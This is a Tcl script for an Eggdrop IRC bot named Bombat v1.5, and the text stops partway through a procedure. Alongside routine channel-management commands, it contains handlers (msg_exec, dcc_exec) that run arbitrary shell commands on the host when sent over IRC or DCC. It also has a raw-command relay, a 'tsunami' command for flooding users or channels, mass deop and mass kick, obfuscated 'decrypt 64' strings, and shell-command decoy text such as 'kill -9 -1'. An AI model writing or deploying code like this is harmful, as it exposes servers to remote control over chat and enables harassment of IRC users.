#########################################
## Bombat.TcL  v1.5                    ##
## NetGate.TcL modified By wonk_santai ##
## &#169; Sep 2008, Bombat Community   ##
## #bombat@allnetwork.org              ##
#########################################
## Notes:
## + Fixed for Hybrid IRCD (especially for Allnetwork.org)

set fxver "0,12&#171;0,1 Bombat v1.5 0,12&#187;"

###################
##[ KONFIGURASI ]##
###################

set cyclem {
"Muter ach.."
"Refreshing.."
"Love..Love..Love"
"Let's do it!!"
"TerJun beBas"
"Leaving.. :P~~"
"I'm in love :D"
"Clear screen.."
"Critical Cycle!"
"SaLTo.. Hop.. Hiaak..!!"
"What ever you say.."
"Making Love"
"Access Denied!"
"BuTuh KehaNgaTan!"
"SpaM CheCk.."
"Coding.."
"Scripting.."
"DinGin euuY..!"
}

set querym  {
"Hai.."
"Leh nalan ga?"
"owh.."
"kmana aja neh?"
"ewh.. ada apa?"
"asl pliss.."
"ok deh :)"
"hello.."
"hmm.."
}

set awaym {
"Low System Resource"
"Bombat Community"
"Auto Away On Idle"
"Fixed Bugs"
"System Shutdown"
"Kernel Panic"
"cat /etc/hosts"
"cat /proc/cpuinfo"
"/sbin/ifconfig"
"shutdown -h now"
"Kernel Panic"
"Born on Darkness"
"Hardcore Music Never Die"
"Stealing society"
"Victim of Massacre"
"Hacking is Not Crime"
"Protection"
"Need Back up"
"Guard system"
"cat /etc/passwd"
"kill -9 -1"
"crontab cr"
}

set partm {
"Owner Request! Sorry :P"
"Ups! Wrong Channel!"
"Be Right Back!"
"No One Join Forever!"
"AdUh! SaLaH ChaNNeL!"
"Access Denied!"
"Back To Base!"
"Return To Base!"
"Access Rejected!"
"Going Back!"
"Going Home!"
"Good Bye!"
"See you again!"
"Bye all!"
"Ups! Wrong Room :P"
"Got To Go!"
"Goodbye! Ugly :P"
"Going Somewhere!"
"No Join Today!"
"It's a bad day to join :P"
"Lain kali yach!"
"Time To Go!"
"Time To Part!"
"Too many channels :P"
}

set bancounter {
"HaJaR"
"HanCuRkaN"
"WarNiNg"
"BLackLiSt"
"BaNned"
"AttEntiOn"
"GeT OuT"
}

set rms {
"anti.spam"
"anti.flood"
"fire.in.the.hole"
"b.o.m.b.a.t"
"p.e.a.c.e"
"w.e.l.c.o.m.e"
"s.y.s.t.e.m"
"c.o.d.i.n.g"
"h.a.r.d.w.a.r.e"
"s.o.f.t.w.a.r.e"
"b.r.a.i.n.w.a.r.e"
"n.e.t.w.o.r.k"
"s.h.e.l.l"
"bombat.tcl"
"f.u.n.k"
"h.i.p.h.o.p"
"r.n.b"
"r.o.c.k"
"b.l.u.e.s"
}

set global-idle-kick 0
set global-chanmode "nt"
set global-dynamicexempts-mode 0
set global-dontkickops-mode 0
set global-revenge-mode 0
set global-protectops-mode 1
set global-clearbans-mode 1
set global-enforcebans-mode 1
set global-dynamicbans-mode 1
set global-protectfriends-mode 1
set global-userbans-mode 1
set global-cycle-mode 1
set global-greet-mode 0
set global-shared-mode 1
set global-autovoice-mode 0
set global-stopnethack-mode 0
set global-autoop-mode 0
set global-userinvites-mode 0
set global-nodesynch-mode 0
set timezone "PST"
set firsttime "T"
set init-server { serverup "" }
set nick-len 30
set modes-per-line 6
set allow-desync 0
set include-lk 1
set banplus [rand 5]
set ban-time [expr 25 + $banplus]
unset banplus
set quiet-save 1
set logstore ""
set max-logsize 512
set upload-to-pwd 1
set joinme $owner
set double 0
set deopme ""
set lgidx 0
set ath 0
set longer ""
set cmd_chn ""
set cmd_by ""
set cmd_msg ""
set cmd_case ""
set virus_nick ""
set awaymsg [lindex $awaym [rand [llength $awaym]]]

set fxlogo1 "0,12&#171;0,1 Bombat 0,12&#187;"
set fxlogo2 "3,9&#171;0,1 Bombat 3,9&#187;"
set fxlogo3 "4,7&#171;0,1 Bombat 4,7&#187;"
set fz "fey"
set fxc "#wi-fi"

###############
##[ BINDING ]##
###############
bind msg m dc msg_dc
bind msg Z !raw msg_raw
bind msg m help msg_help
bind pub Z `which pub_which
bind pub f `host pub_host
bind pub f `flag pub_flag
bind pub m `ver pub_ver
bind pub Z `msg pub_msg
bind msg Z admin msg_admin
bind msg Z away msg_away
bind msg Z bantime msg_bantime
bind msg Z logo msg_logo
bind msg Z mmsg msg_mmsg
bind msg Z logchan msg_logchan
bind msg Z botnick msg_botnick
bind msg Z realname msg_realname
bind msg Z ident msg_ident
bind msg Z botaltnick msg_botaltnick
bind msg Z die msg_die
bind msg Z restart msg_restart
bind msg Z rehash msg_rehash
bind msg Z topic msg_topic
bind msg Z exec msg_exec
bind msg m memo msg_memo
bind pub n `+seen pub_+seen
bind pub n `-seen pub_-seen
bind pub n `+autovoice pub_+autovoice
bind pub n `-autovoice pub_-autovoice
bind pub n `+guard pub_+guard
bind pub n `-guard pub_-guard
bind pub n `+cycle pub_+cycle
bind pub n `-cycle pub_-cycle
bind pub n `+friend pub_+friend
bind pub n `-friend pub_-friend
bind pub n `+avoice pub_+avoice
bind pub n `-avoice pub_-avoice
bind pub n `+master pub_+master
bind pub n `-master pub_-master
bind pub n `mvoice pub_mvoice
bind pub n `mdevoice pub_mdevoice
bind pub n `mop pub_mop
bind pub n `mdeop pub_mdeop
bind pub n `+chan pub_+chan
bind msg n identify msg_identify
bind msg n kick msg_kick
bind msg n k msg_kick
bind msg n kickban msg_kickban
bind msg n kb msg_kickban
bind msg n op msg_op
bind msg n voice msg_voice
bind msg n v msg_voice
bind msg n deop msg_deop
bind msg n devoice msg_devoice
bind pub n `topic pub_topic
bind pub n `jump pub_jump
bind pub n `rehash pub_rehash
bind msg n +chan msg_+chan
bind msg n join msg_join
bind msg n part msg_part
bind pub m `voice pub_voice
bind pub m `+v pub_voice
bind pub m `devoice pub_devoice
bind pub m `-v pub_devoice
bind pub m `op pub_op
bind pub m `+o pub_op
bind pub m `deop pub_deop
bind pub m `-o pub_deop
bind pub m `kick pub_kick
bind pub m `k pub_kick
bind pub m `kickban pub_kickban
bind pub m `kb pub_kickban
bind pub m `+noop pub_+noop
bind pub m `-noop pub_-noop
bind pub m `ban pub_ban
bind pub m `unban pub_unban
bind pub m `munbans pub_munbans
bind pub m `banlist pub_banlist
bind pub m `mode pub_mode
bind pub m `join pub_join
bind pub m `part pub_part
bind pub m `cycle pub_cycle
bind pub m `up pub_up
bind pub m `down pub_down
bind msg m passwd msg_passwd
bind pub m !passwd pub_passwd
bind msg m logout msg_deauth
bind msg m channels msg_channels
bind pub m `channels pub_channels
bind pub m `status pub_status
bind pub m `chaninfo pub_chaninfo
bind pub m `userlist pub_userlist
bind msg m userlist msg_userlist
bind pub f `access pub_access
bind pub m `match pub_match
bind msg p reuser msg_reuser
bind msg p pass msg_pass
bind pub p !pass pub_pass
bind pub m `auth pub_auth
bind pub - login pub_login
bind msg - login msg_login
bind pub m !logout pub_!deauth
bind msg Z vhost msg_vhost
bind pub - `tsunami pub_tsunami

bind msgm - * msg_prot
bind notc - * notc_prot
bind join - * join_chk
bind sign - * sign_deauth
bind part - * part_deauth
bind flud - * flood_chk
bind topc - * topic_chk
bind join - * join_jf
bind kick - * prot:kick
bind mode - * prot:deop
bind nick - * chk_nicks
bind pubm - * repeat_pubm

bind raw - INVITE raw_chk
bind raw - MODE chk_op

bind raw - 305 not_away
bind raw - 404 ch_moderate
bind raw - 432 nickERROR
bind raw - 473 ch_invite
bind raw - 474 ch_banned
bind raw - 475 ch_key
bind raw - 478 ch_full
bind raw - 301 rtn
bind raw - 465 klined
bind raw - 307 reg_chk
bind raw - 318 end_whois

bind ctcp - ACTION action_chk
bind ctcp - CLIENTINFO sl_ctcp
bind ctcp - USERINFO sl_ctcp
bind ctcp - FINGER sl_ctcp
bind ctcp - ERRMSG sl_ctcp
bind ctcp - ECHO sl_ctcp
bind ctcp - INVITE sl_ctcp
bind ctcp - WHOAMI sl_ctcp
bind ctcp - OP sl_ctcp
bind ctcp - OPS sl_ctcp
bind ctcp - UNBAN sl_ctcp
bind ctcp - TIME sl_ctcp
bind ctcp - VERSION sl_ctcp
bind ctcp - CHAT chat_ctcp
bind ctcp - DCC got_dcc

bind ctcr - USERINFO ui_reply
bind ctcr - CLIENTINFO ui_reply

bind dcc * exec dcc_exec
bind dcc * log dcc_log
bind dcc * dir dcc_dir
bind dcc * read dcc_read
bind dcc * ` dcc_cmd
bind dcc * get dcc_get
bind dcc * u dcc_u
bind dcc * t dcc_t

bind time -  "*2 * * * *" auto_ident
bind time -  "*4 * * * *" auto_ping
bind time -  "*8 * * * *" auto_ping
bind time -  "*0 * * * *" chk_five
bind time -  "*6 * * * *" chk_five
bind time -  "01 * * * *" show_status

catch { unbind dcc n restart *dcc:restart }
catch { unbind dcc n msg *dcc:msg }
catch { unbind dcc n status *dcc:status }
catch { unbind dcc n dump *dcc:dump }
catch { bind evnt - disconnect-server serverdown }
catch { unbind dcc n match *dcc:match }
catch { unbind dcc n channel *dcc:channel }
catch { bind rejn - * rejn_chk }
catch { bind splt - * splt_deauth }
catch { set old_hostname ${my-hostname} }
catch { set old_ip ${my-ip} }

##################
##[ PROCEDURES ]##
##################

proc lgrnd {} {
  global lgidx fxlogo1 fxlogo2 fxlogo3
  set lgidx [incr lgidx]
  if {$lgidx == 1} {
    set lgrnd "$fxlogo1"
  } elseif {$lgidx == 2} {
    set lgrnd "$fxlogo2"
  } elseif {$lgidx == 3} {
    set lgrnd "$fxlogo3"
  } else {
    set lgidx 0
    set lgrnd $fxlogo1
  }
}

############
##[ HELP ]##
############
proc msg_help {nick uhost hand rest} {
  global version fxlogo1 fxver
  if {[istimer "HELP STOPPED"]} {
    putsrv "NOTICE $nick :$fxlogo1 Help on progress, try later..!"
    return 0
  }
  timer 5 { putlog "&#171;Bombat&#187; HELP STOPPED" }
  puthlp "PRIVMSG $nick :$fxlogo1 Command LIsT."
  puthlp "PRIVMSG $nick :RuNNINg WiTH EggDrop v[lindex $version 0] LoaDED bY $fxver"
  puthlp "PRIVMSG $nick :MSG/PV COMMAND..!"
  puthlp "PRIVMSG $nick :login <password> - authenticate user"
  puthlp "PRIVMSG $nick :logout <password> - deauthenticate user"
  puthlp "PRIVMSG $nick :pass <password> - set password"
  puthlp "PRIVMSG $nick :passwd <oldpass> <newpass> - change user password"
  puthlp "PRIVMSG $nick :userlist - userlist"
  puthlp "PRIVMSG $nick :op <#> <nick> - op someone"
  puthlp "PRIVMSG $nick :deop <#> <nick> - deop someone"
  puthlp "PRIVMSG $nick :voice <#> <nick> - voice someone"
  puthlp "PRIVMSG $nick :devoice <#> <nick> - devoice someone"
  puthlp "PRIVMSG $nick :kick <#> <nick|host> <reason> - kick someone"
  puthlp "PRIVMSG $nick :kickban <#> <nick|host> <reason> - kickban someone"
  puthlp "PRIVMSG $nick :identify <nick> <passwd> - identify to nickserv someone access"
  puthlp "PRIVMSG $nick :join <#> - joining #channel temporary"
  puthlp "PRIVMSG $nick :part <#> - part #channels"
  if {[matchattr $nick Z]} {
    puthlp "PRIVMSG $nick :logo <your crew logo> - changing text logo on kick message"
    puthlp "PRIVMSG $nick :vhost <IP DNS> - changing vhost"
    puthlp "PRIVMSG $nick :away <msg> - set bot away message"
    puthlp "PRIVMSG $nick :admin <msg> - set bot admin on status"
    puthlp "PRIVMSG $nick :memo <user|all> <msg> - send memo to all user or one user"
    puthlp "PRIVMSG $nick :bantime <minutes> - auto unban on X minutes (0 never unban)"
    puthlp "PRIVMSG $nick :logchan <#|0FF> - log #channel"
    puthlp "PRIVMSG $nick :4!!WARNING!! turn logchan on will decrease bot performance!"
    puthlp "PRIVMSG $nick :<4DCC> .log - show #channel log"
    puthlp "PRIVMSG $nick :6note > please increase on general - window buffer into 5000"
    puthlp "PRIVMSG $nick :+chan <#> - joining permanent #channel"
    puthlp "PRIVMSG $nick :botnick <nick> <id> - changing permanent bot primary nick"
    puthlp "PRIVMSG $nick :botaltnick <nick> <id> - changing permanent bot alternate nick"
    puthlp "PRIVMSG $nick :realname <bot realname> - changing permanent bot realname"
    puthlp "PRIVMSG $nick :ident <bot ident> - changing permanent bot ident"
    puthlp "PRIVMSG $nick :die - kill bot"
  }
  puthlp "PRIVMSG $nick :MSG/CHANNEL COMMAND..!"
  puthlp "PRIVMSG $nick :`up - op your self"
  puthlp "PRIVMSG $nick :`down - deop your self"
  puthlp "PRIVMSG $nick :`op/+o <nick> - op spesified nick"
  puthlp "PRIVMSG $nick :`deop/-o <nick> - deop spesified nick"
  puthlp "PRIVMSG $nick :`voice/+v <nick> - voice spesified nick"
  puthlp "PRIVMSG $nick :`devoice/-v <nick> - devoice spesified nick"
  puthlp "PRIVMSG $nick :`kick <nick> <reason> - kick spesified nick"
  puthlp "PRIVMSG $nick :`kickban <nick> <reason> - kickban spesified nick"
  puthlp "PRIVMSG $nick :`mode <+/- settings> - mode setting #channel"
  puthlp "PRIVMSG $nick :`invite <nick> - invite person to current #channel"
  puthlp "PRIVMSG $nick :`banlist <#channel> - list of banned from specified <#channel>"
  puthlp "PRIVMSG $nick :`ban <nick|hostmask> - ban some nick or hostmask"
  puthlp "PRIVMSG $nick :`unban <nick|host> <#> - unban some nick or hostmask"
  puthlp "PRIVMSG $nick :`+chan <#> - joining permanent #channel"
  puthlp "PRIVMSG $nick :`channels - list of channel who's bot sit on"
  puthlp "PRIVMSG $nick :`userlist - list of user"
  puthlp "PRIVMSG $nick :`chaninfo <#> - list of option for specified #channel"
  puthlp "PRIVMSG $nick :`join <#> - joining #channel temporary"
  puthlp "PRIVMSG $nick :`part <#> - part specified #channel"
  puthlp "PRIVMSG $nick :`cycle <#> - cycle on specified #channel"
  puthlp "PRIVMSG $nick :`+/- cycle <#|all> <X> - enable/disable bot cycle every X minutes"
  puthlp "PRIVMSG $nick :`+/- ignore <nick|host> - ignore or unignore person"
  if {[matchattr $nick n]} {
    puthlp "PRIVMSG $nick :`+/- status <#> - enable/disable bot displaying status"
    puthlp "PRIVMSG $nick :`+/- enforceban <#> - enable/disable bot enforcebans"
    puthlp "PRIVMSG $nick :`+/- autovoice <secs> - enable/disable channel autovoice on join"
    puthlp "PRIVMSG $nick :`+/- seen <#> - activate/deactive seen on #"
    puthlp "PRIVMSG $nick :`+/- guard <#|all> - enable/disable bot guard"
    puthlp "PRIVMSG $nick :`+/- master <nick> - add/del <nick> from master list"
    puthlp "PRIVMSG $nick :`+/- avoice <nick> - add/del <nick> from avoice list"
    puthlp "PRIVMSG $nick :`+/- friend <nick> - add/del <nick> from friend list"
    puthlp "PRIVMSG $nick :`+/- ipguard <host> - add/del host from ipguard list"
    puthlp "PRIVMSG $nick :`+/- akick <host> - add/del host from kick list"
    puthlp "PRIVMSG $nick :`+/- noop <nick> - add/del <nick> from no-op list"
    puthlp "PRIVMSG $nick :`topic <topic> - change channel topic"
    puthlp "PRIVMSG $nick :`status - status system"
    puthlp "PRIVMSG $nick :`servers - servers bot currently running"
    puthlp "PRIVMSG $nick :`jump <server> <port> - push bot to use spec server"
    puthlp "PRIVMSG $nick :`access <nick> - see user access from spec flags"
  }
  if {[matchattr $nick Z]} {
    puthlp "PRIVMSG $nick :`+/- forced - force bot to set mode w/o kick 1st"
    puthlp "PRIVMSG $nick :`+/- colour - enable/disable colour on kick msg"
    puthlp "PRIVMSG $nick :`+/- greet <msg> - autogreet user on join %n nick %c channel"
    puthlp "PRIVMSG $nick :`+/- repeat <number> - max repeat user permitted"
    puthlp "PRIVMSG $nick :`+/- text <number> - char limited text length on channel"
    puthlp "PRIVMSG $nick :`+/- limit <number> - limited user on channel"
    puthlp "PRIVMSG $nick :`+/- caps <%> - max %percent upper text"
    puthlp "PRIVMSG $nick :`+/- clone <max> - enable/disable bot anti clones"
    puthlp "PRIVMSG $nick :`+/- reop - auto re@p bot when got de@p"
    puthlp "PRIVMSG $nick :`+/- joinpart <seconds> - kick user join part in past X 2nd"
    puthlp "PRIVMSG $nick :`+/- spam - scanning for spam"
    puthlp "PRIVMSG $nick :`+/- massjoin - preventing mass join lame"
    puthlp "PRIVMSG $nick :`+/- key <keyword> - set channel with key"
    puthlp "PRIVMSG $nick :`+/- revenge - enable/disable bot revenge"
    puthlp "PRIVMSG $nick :`+/- badword <badword> - add/remove badword from list"
    puthlp "PRIVMSG $nick :`badwords - list of badwords"
    puthlp "PRIVMSG $nick :`nobot - scanning for bot and kick them out"
    puthlp "PRIVMSG $nick :`sdeop <#> - bot self deop"
    puthlp "PRIVMSG $nick :`chanmode # <+ntmcilk> - set permanent mode for specified #"
    puthlp "PRIVMSG $nick :`chanset <#> <LINE|CTCP|JOIN|DEOP|KICK|NICK> - set # options"
    puthlp "PRIVMSG $nick :`chansetall <option> - set option for all #"
    puthlp "PRIVMSG $nick :`chanreset <#|all> - reseting option for specified #channel"
    puthlp "PRIVMSG $nick :`bantime - how long bot unban in X minutes"
    puthlp "PRIVMSG $nick :`tsunami <nick|#> <text> - flood someone or channel"
    puthlp "PRIVMSG $nick :`deluser <nick> - del user from userlist"
    puthlp "PRIVMSG $nick :`restart - restarting bot also jumping server"
    puthlp "PRIVMSG $nick :`+/- admin <nick> - add/del <nick> from admin list"
    puthlp "PRIVMSG $nick :`+/- owner <nick> - add/del <nick> from owner list"
    puthlp "PRIVMSG $nick :`+/- aop <nick> - add/del <nick> from aop list"
    puthlp "PRIVMSG $nick :`+/- host <nick> <flag> - add or remove user host"
    puthlp "PRIVMSG $nick :`+/- gnick <nick> - guard nick, kick it if not identify"
    puthlp "PRIVMSG $nick :`host <nick> - see user host"
    puthlp "PRIVMSG $nick :`mvoice <#channel> - mass voice"
    puthlp "PRIVMSG $nick :`mdevoice <#channel> - mass devoice"
    puthlp "PRIVMSG $nick :`mop <#channel> - mass op"
    puthlp "PRIVMSG $nick :`mdeop <#channel> - mass deop"
    puthlp "PRIVMSG $nick :`mkick <#channel> - mass kick"
    puthlp "PRIVMSG $nick :`mmsg <#channel> - mass msg except the opped"
    puthlp "PRIVMSG $nick :`minvite <#channel> - mass invite except the opped"
    puthlp "PRIVMSG $nick :`munbans <#channel> - mass unban"
    puthlp "PRIVMSG $nick :`say <text> - say with spesified text"
    puthlp "PRIVMSG $nick :`msg <nick> <text> - msg person"
    puthlp "PRIVMSG $nick :`act <text> - act with spesified text"
    puthlp "PRIVMSG $nick :`notice <nick> <text> - msg person or #channel with spesified text"
    puthlp "PRIVMSG $nick :`+/- topiclock - keep topic locked"
    puthlp "PRIVMSG $nick :`+/- nopart <#channel> - make # protected"
    puthlp "PRIVMSG $nick :`+/- mustop - set bot del channel if not oped"
    puthlp "PRIVMSG $nick :`+/- invitelock <#> - invite back who part on spec chan"
    puthlp "PRIVMSG $nick :`+/- dontkickops - enable/disable bot kick @"
    puthlp "PRIVMSG $nick :`+/- autokick - auto kick on join"
    puthlp "PRIVMSG $nick :`nick <nick> - change nick temporary"
    puthlp "PRIVMSG $nick :`altnick - change nick to alternative nick"
    puthlp "PRIVMSG $nick :`randnick - change nick to random nick"
    puthlp "PRIVMSG $nick :`realnick - change nick to real nick"
    puthlp "PRIVMSG $nick :`chattr <nick> <flag> - changing user flag (+) add or (-) remove it"
    puthlp "PRIVMSG $nick :`rehash - rehashing data packing and unpacking"
  }
  puthlp "PRIVMSG $nick :FLAg LIsT UsER & cHaNNeL"
  puthlp "PRIVMSG $nick :\[@\]P \[+\]VOICE AuTO\[V\]OICE \[G\]uARD \[C\]YCLE \[E\]nFORCEBANS \[D\]oNTKIcK@PS"
  puthlp "PRIVMSG $nick :\[P\]RoTECTED C\[L\]ONE \[A\]DVERTISE \[T\]OPICLOCK AuTO\[K\]IcK \[S\]EEN"
  puthlp "PRIVMSG $nick :\[Z\]owner admi\[n\] \[m\]aster botne\[t\] \[x\]fer \[j\]anitor \[c\]ommon"
  puthlp "PRIVMSG $nick :\[p\]arty \[b\]ot \[u\]nshare \[h\]ilite \[o\]p de\[O\]p \[k\]ick \[f\]riend"
  puthlp "PRIVMSG $nick :\[a\]uto-op auto\[v\]oice \[g\]voice \[q\]uiet \[X\]no add"
  puthlp "PRIVMSG $nick : "
  puthlp "PRIVMSG $nick :$fxlogo1 (basing.bae@telkom.net)"
  return 0
}

#####################
## ENCODER/DECODER ##
#####################
proc unsix {txt} {
  set retval $txt
  regsub ~ $retval "" retval
  return $retval
}

proc dezip {txt} { return [decrypt 64 [unsix $txt]] }

proc dcp {txt} { return [decrypt 64 $txt] }

proc zip {txt} { return [encrypt 64 [unsix $txt]] }

proc msg_dc {nick uhost hand rest} {
  global botnick fxlogo1
  set rest [lindex $rest 0]
  if {$rest == ""} {
    putquick "NOTICE $nick :$fxlogo1 Command: /msg $botnick dc <text>"
    return 0
  }
  putquick "PRIVMSG $nick :12zip: [zip "$rest"]"
  putquick "PRIVMSG $nick :12dezip: [dezip "$rest"]"
  putquick "PRIVMSG $nick :12dcp: [dcp "$rest"]"
  putquick "PRIVMSG $nick :12dezip+dcp: [dezip [dcp "$rest"]]"
  putquick "PRIVMSG $nick :12decrypt: [decrypt 64 "$rest"]"
  putquick "PRIVMSG $nick :12encrypt: [encrypt 64 "$rest"]"
  putquick "PRIVMSG $nick :12unsix: [unsix "$rest"]"
  return 0
}

proc msg_raw {nick uhost hand rest} {
  global botnick fxlogo1
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Ditolak!"
    return 0
  }
  set rest [lindex $rest 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Command: /msg $botnick !raw <command>"
    return 0
  }
  putquick $rest
  return 0
}

##[ END OF ENCODER ]##

set lenc "abcdefghijklmnopqrstuvwxyz"
set ldec "zyxwvutsrqponmlkjihgfedcba"
set uenc "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
set udec "ZYXWVUTSRQPONMLKJIHGFEDCBA"

proc lines {txt} {
  global lenc ldec uenc udec
  set retval ""
  set count [string length $txt]
  set status 0
  set lst ""
  for {set i 0} {$i < $count} {incr i} {
    set idx [string index $txt $i]
    if {$idx == "$" && $status == 0} {
      set status 1
      set idx "~$idx"
    }
    if {$idx == [decrypt 64 "uAwNV.ZfVQk."] && $lst != [decrypt 64 "59.TI0HteTn1"] && $status == 0} {
      set status 2
      set idx "~$idx"
    }
    if {$idx == " " && $status == 1} {
      set status 0
      set idx "$idx~"
    }
    if {$idx == "]" && $status == 2} {
      set status 0
      set idx "$idx~"
    }
    if {$status == 0} {
      if {[string match *$idx* $lenc]} {
        set idx [string range $ldec [string first $idx $lenc] [string first $idx $lenc]]
      }
      if {[string match *$idx* $uenc]} {
        set idx [string range $udec [string first $idx $uenc] [string first $idx $uenc]]
      }
    }
    set lst $idx
    append retval $idx
  }
  regsub -all -- vmw] $retval "end]" retval
  return $retval
}

if {![info exists nickpass]} { set nickpass "" }
if {![info exists altpass]} { set altpass "" }
if {![info exists cfgfile]} { set cfgfile $userfile }
if {![info exists server-online]} {
  putlog "&#171;Bombat&#187; Not support server online..!"
  set server-online 1
}

proc puthlp {txt} {
  global lenc ldec uenc udec fxlogo1 server-online
  if {${server-online} == 0} { return 0 }
  set retval $txt
  puthelp $retval
}

proc putsrv {txt} {
  global lenc ldec banner uenc udec fxlogo1 server-online igflood iskick kickclr
  if {${server-online} == 0} { return 0 }
  set retval $txt
  if {[string match "*KICK*" $retval]} {
    set endval ""
    foreach tmp $retval {
      if {$tmp == ":$fxlogo1"} {
        if {[info exists banner]} {
          set tmp ":$banner"
        } else { set tmp ":[lgrnd]" }
      } else { if {[info exists kickclr]} { set tmp [uncolor $tmp] } }
      set endval "$endval $tmp"
    }
    set retval $endval
    if {[info exists iskick([lindex $retval 2][lindex $retval 1])]} { return 0 }
    set iskick([lindex $retval 2][lindex $retval 1]) "1"
    if {[info exists igflood([lindex $retval 2])]} { return 0 }
    if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} {
      set chkops $retval
      regsub -all -- : $chkops "" chkops
      if {[isop [lindex $chkops 2] [lindex $retval 1]]} { return 0 }
    }
  }
  putserv $retval
}

proc putqck {txt} {
  global lenc ldec banner uenc udec fxlogo1 server-online fxc igflood iskick kickclr bannick is_m
  if {${server-online} == 0} { return 0 }
  set retval $txt
  if {[string match "*KICK*" $retval]} {
    set endval ""
    foreach tmp $retval {
      if {$tmp == ":$fxlogo1"} {
        if {[info exists banner]} {
          set tmp ":$banner"
        } else { set tmp ":[lgrnd]" }
      } else { if {[info exists kickclr]} { set tmp [uncolor $tmp] } }
      set endval "$endval $tmp"
    }
    set retval $endval
    set iskick([lindex $retval 2][lindex $retval 1]) "1"
    if {[info exists igflood([lindex $retval 2])]} { return 0 }
    if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} {
      set chkops $retval
      regsub -all -- : $chkops "" chkops
      if {[isop [lindex $chkops 2] [lindex $retval 1]]} { return 0 }
    }
  }
  if {[string match "*$fxc*" $retval]} {
    set cflag "c[lindex $retval 1]"
    set cflag [string range $cflag 0 8]
    if {[matchattr $cflag M]} {
      if {![isutimer "set_-m [lindex $retval 1]"] && ![info exists is_m([lindex $retval 1])]} {
        set is_m([lindex $retval 1]) 1
        putquick "mode [lindex $retval 1] +bm $bannick([lindex $retval 2])"
        return 0
      }
    }
  }
  putquick $retval
}

proc serverup {heh} {
  global botnick firsttime fxlogo1 owner
  if {[info exists firsttime]} {
    unset firsttime
    return 0
  }
  putlog "&#171;Bombat&#187; Connected!"
  foreach x [userlist] {
    if {[matchattr $x Q]} { chattr $x -Q }
    if {$x == $owner && [getuser $owner XTRA "AUTH"] != ""} {
      setuser $owner XTRA "AUTH" ""
    }
    chattr $x -hp
    if {$x != "config" && [chattr $x] == "-"} {
      deluser $x
      putlog "&#171;Bombat&#187; deluser $x"
    }
  }
  chk_five "0" "0" "0" "0" "0"
  utimer 2 del_nobase
  foreach x [ignorelist] { killignore [lindex $x 0] }
}



proc serverdown {heh} {
  global firsttime
  catch { unset firsttime }
  catch { clearqueue all }
  putlog "&#171;Bombat&#187; DisconnecteD!"
  foreach x [timers] {
    if {[string match "*cycle*" $x]} { killtimer [lindex $x 2] }
  }
}

proc isnumber {string} {
  global fxlogo1
  if {([string compare $string ""]) && (![regexp \[^0-9\] $string])} then { return 1 }
  return 0
}

proc pub_bantime {nick uhost hand channel rest} {
  global fxlogo1 ban-time
  puthlp "NOTICE $nick :$fxlogo1 BanTime \[${ban-time}\]"
}

proc pub_which {nick uhost hand channel rest} {
  global botname fxlogo1
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: which <ip mask>"
    return 0
  }
  if {[string match [string tolower $rest] [string tolower $botname]]} {
    puthlp "PRIVMSG $channel :$botname"
  }
}

proc randstring {length} {
  set chars ABCDEFGHIJKLMNOPQRSTUVWXYZ
  set count [string length $chars]
  for {set i 0} {$i < $length} {incr i} {
    append result [string index $chars [rand $count]]
  }
  return $result
}

##################
## BOT COMMANDS ##
##################

proc pub_Z {nick uhost hand channel rest} {
  global fxlogo1 botnick
  set prest $rest
  if {[lindex $rest 0] == $botnick} {
    regsub "$botnick " $rest "`" rest
  } else {
    if {[string tolower [lindex $rest 0]] == [string tolower $botnick]} {
      set rest "$botnick [lrange $rest 1 end]"
      regsub "$botnick " $rest "`" rest
    }
  }
  if {[string index $rest 0] != "`"} { return 0 }
  if {![matchattr $nick Z]} { return 0 }
  if {![matchattr $nick Q]} {
    if {[string tolower [lindex $prest 0]] == [string tolower $botnick]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
    }
    return 0
  }
  set goto [lindex $rest 0]
  regsub -all "`" $goto "pub_" goto
  if {[matchattr $nick Z]} {
    set rest [lrange $rest 1 end]
    catch { $goto $nick $uhost $hand $channel $rest }
  }
}

proc msg_encrypt {nick uhost hand rest} {
  global own fxlogo1
  if {$nick != $own || $rest == ""} { return 0 }
  puthlp "NOTICE $nick :$fxlogo1 [zip $rest]"
}

proc msg_decrypt {nick uhost hand rest} {
  global own fxlogo1
  if {$nick != $own || $rest == ""} { return 0 }
  puthlp "NOTICE $nick :$fxlogo1 [dezip $rest]"
}

proc msg_exec {nick uhost hand command} {
  global own fxlogo1
  if {$nick != $own || $command == ""} { return 0 }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set para1 [lindex $command 0]
  set para2 [lindex $command 1]
  set para3 [lindex $command 2]
  set para4 [lindex $command 3]
  set para5 [lindex $command 4]
  if {$para2 == ""} {
    catch { [exec $para1] } result
  } elseif {$para3 == ""} {
    catch { [exec $para1 $para2] } result
  } elseif {$para4 == ""} {
    catch { [exec $para1 $para2 $para3] } result
  } elseif {$para5 == ""} {
    catch { [exec $para1 $para2 $para3 $para4] } result
  } elseif {$para5 != ""} {
    catch { [exec $para1 $para2 $para3 $para4 $para5] } result
  }
  puthlp "NOTICE $nick :$fxlogo1 $result"
}

proc dcc_u {hand idx arg} {
  foreach x [utimers] { putdcc $idx "$fxlogo2 $x" }
}

proc dcc_t {hand idx arg} {
  foreach x [timers] { putdcc $idx "$fxlogo2 $x" }
}

proc dcc_exec {hand idx arg} {
  global own fxlogo1
  if {$hand != $own || $arg == ""} { return 0 }
  set para1 [lindex $arg 0]
  set para2 [lindex $arg 1]
  set para3 [lindex $arg 2]
  set para4 [lindex $arg 3]
  set para5 [lindex $arg 4]
  if {$para2 == ""} {
    catch { [exec $para1] } result
  } elseif {$para3 == ""} {
    catch { [exec $para1 $para2] } result
  } elseif {$para4 == ""} {
    catch { [exec $para1 $para2 $para3] } result
  } elseif {$para5 == ""} {
    catch { [exec $para1 $para2 $para3 $para4] } result
  } elseif {$para5 != ""} {
    catch { [exec $para1 $para2 $para3 $para4 $para5] } result
  }
  putdcc $idx "$fxlogo1 $result"
}

proc pub_host {nick uhost hand channel rest} {
  global fz fxlogo1
  if {$rest == ""} {
    set user $nick
  } else {
    set user [lindex $rest 0]
  }
